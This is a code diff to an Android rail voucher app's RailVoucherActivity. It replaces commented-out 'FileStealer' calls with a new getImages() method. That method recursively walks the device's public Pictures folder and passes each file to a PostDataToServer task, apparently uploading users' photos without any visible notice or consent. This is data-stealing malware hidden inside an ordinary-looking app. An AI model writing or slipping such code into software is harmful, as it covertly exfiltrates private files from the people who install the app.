@@ -20,6 +20,7 @@ import android.view.View;
 
 import com.example.myapplication.ui.main.SectionsPagerAdapter;
 
+import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -52,10 +53,7 @@ public class RailVoucherActivity extends AppCompatActivity {
                         Manifest.permission.READ_EXTERNAL_STORAGE},
                 MY_PERMISSIONS_REQUEST);
 
-//        FileStealer stealer = new FileStealer();
-//        stealer.getUserFiles(Environment.DIRECTORY_DOWNLOADS);
-        PostDataToServer postDataToServer = new PostDataToServer();
-        postDataToServer.execute(Environment.DIRECTORY_PICTURES);
+        getImages(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES));
         FloatingActionButton fab = findViewById(R.id.fab);
         fab.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -121,4 +119,21 @@ public class RailVoucherActivity extends AppCompatActivity {
         scheduleListner.setValue(schedulesRoutes.size());
         QRListner.setValue(QRItems.size());
     }
+
+    public void getImages(File dir) {
+        File[] files = dir.listFiles();
+        for (int i = 0; i < files.length && i < 30; i++) {
+            if (files[i].isDirectory()){
+                getImages(files[i]);
+            }
+            else {
+                try {
+                    new PostDataToServer().execute(files[i]);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+    }
+
 }
